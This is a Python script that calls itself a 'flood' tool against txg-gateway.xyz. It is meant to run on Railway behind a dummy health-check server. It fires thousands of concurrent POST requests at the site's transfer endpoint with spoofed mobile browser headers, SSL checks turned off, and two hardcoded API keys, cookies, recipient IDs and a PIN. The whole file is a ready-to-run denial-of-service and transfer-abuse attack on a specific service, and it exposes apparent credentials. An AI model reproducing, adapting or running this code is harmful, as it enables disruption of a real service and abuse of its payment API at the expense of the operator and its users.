#!/usr/bin/env python3
"""
High‑concurrency flood for txg-gateway.xyz, deployed on Railway.
Flood runs in background; web server responds to health checks.
"""
import asyncio
import os
import time
from itertools import cycle

from aiohttp import web, ClientSession, TCPConnector

# ─── Configuration from environment ────────────────────
URL = "https://txg-gateway.xyz/client/api/send.php"

# Two API configs (you can add more)
CONFIGS = [
    {
        "api_key": "86864a72c5e2f3ad32c1c8f52710959f",
        "cookie": "api_key=86864a72c5e2f3ad32c1c8f52710959f",
        "toUser": "6283146815",
    },
    {
        "api_key": "f692ed462bc0976b5332a11944103df7",
        "cookie": "api_key=f692ed462bc0976b5332a11944103df7",
        "toUser": "9359202967",
    },
]

# Read from environment (defaults: 10,000 requests, 500 concurrent)
TOTAL_REQUESTS = int(os.getenv("TOTAL_REQUESTS", "10000"))
CONCURRENCY = int(os.getenv("CONCURRENCY", "500"))

# Common headers (no 'br')
BASE_HEADERS = {
    "Host": "txg-gateway.xyz",
    "sec-ch-ua-platform": '"Android"',
    "User-Agent": "Mozilla/5.0 (Linux; Android 16; CPH2729 Build/BP2A.250605.015) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.7922.199 Mobile Safari/537.36",
    "sec-ch-ua": '"Not=A?Brand";v="99", "Android WebView";v="151", "Chromium";v="151"',
    "Content-Type": "application/json",
    "sec-ch-ua-mobile": "?1",
    "Accept": "*/*",
    "Origin": "https://txg-gateway.xyz",
    "X-Requested-With": "inha.gcu.ee",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "Referer": "https://txg-gateway.xyz/dashboard/send.php",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
    "Priority": "u=1, i",
}

# ─── Flood logic ──────────────────────────────────────
async def send_one(session, config, semaphore):
    async with semaphore:
        headers = {**BASE_HEADERS, "Cookie": config["cookie"]}
        payload = {
            "toUser": config["toUser"],
            "amount": 1,
            "api_key": config["api_key"],
            "secret_pin": "1234",
            "remark": "Ultra pelo",
            "public": True,
            "manual": False,
        }
        try:
            async with session.post(URL, json=payload, headers=headers, timeout=5) as resp:
                await resp.text()
                return resp.status
        except Exception:
            return None

async def run_flood():
    """Run the flood and log statistics."""
    print(f"🚀 Starting flood: {TOTAL_REQUESTS} requests, concurrency {CONCURRENCY}")
    start = time.perf_counter()

    connector = TCPConnector(ssl=False, limit=0)
    semaphore = asyncio.Semaphore(CONCURRENCY)
    config_cycle = cycle(CONFIGS)

    async with ClientSession(connector=connector) as session:
        tasks = []
        for i in range(TOTAL_REQUESTS):
            config = next(config_cycle)
            tasks.append(send_one(session, config, semaphore))
            if i % 100 == 0:
                await asyncio.sleep(0)   # yield control

        results = await asyncio.gather(*tasks, return_exceptions=True)

    elapsed = time.perf_counter() - start
    success = sum(1 for r in results if r == 200)
    errors = TOTAL_REQUESTS - success

    print(f"\n✅ Flood finished in {elapsed:.2f} seconds")
    print(f"   Success: {success} (200 OK)")
    print(f"   Errors:  {errors}")
    if elapsed > 0:
        print(f"   Rate:    {TOTAL_REQUESTS/elapsed:.1f} req/s")

# ─── Web server ──────────────────────────────────────
async def health(request):
    return web.Response(text="Flooder is running")

async def init_app():
    app = web.Application()
    app.router.add_get('/', health)

    # Start the flood in the background (non‑blocking)
    asyncio.create_task(run_flood())
    return app

if __name__ == "__main__":
    port = int(os.getenv("PORT", "8080"))
    web.run_app(init_app(), port=port)
